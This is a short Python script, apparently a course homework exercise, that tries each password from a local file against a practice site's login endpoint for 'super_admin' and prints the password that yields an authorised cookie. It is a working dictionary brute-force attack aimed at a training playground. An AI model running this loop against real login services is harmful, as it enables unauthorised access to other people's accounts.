import requests

url_get_password = 'https://playground.learnqa.ru/ajax/api/get_secret_password_homework'
url_check_auth = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"

with open('passwords.txt', "r", encoding='utf-8') as file:
    for line in file:
        password = line.strip()
        response_get_password = requests.post(url=url_get_password, data={"login": "super_admin", "password": password})
        response_check_auth = requests.get(url=url_check_auth, cookies=dict(response_get_password.cookies))
        if response_check_auth.text != "You are NOT authorized":
            print(response_check_auth.text)
            print(f"Right password is: {password}")

